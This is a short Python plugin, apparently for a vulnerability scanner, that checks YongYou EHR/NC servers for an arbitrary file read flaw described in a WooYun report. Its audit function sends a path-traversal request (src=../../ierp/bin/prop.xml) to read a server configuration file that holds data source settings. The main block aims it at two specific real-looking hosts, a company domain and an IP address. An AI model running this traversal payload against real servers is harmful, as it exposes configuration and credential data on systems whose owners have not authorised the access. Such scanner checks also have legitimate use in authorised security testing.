#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:YongYou EHR 任意文件读取
#Refer:http://www.wooyun.org/bugs/wooyun-2014-066512

def assign(service,arg):
    if service=="yongyou_nc":
        return True,arg 
    

def  audit(arg):
    url=arg+"hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<enableHotDeploy>" in res and '<dataSource>' in res:
        security_hole(url)
    

if __name__=="__main__":
    from dummy import *
    audit(assign('yongyou_nc','http://hr.nanfu.com/')[1])
    audit(assign('yongyou_nc','http://60.13.183.174/')[1])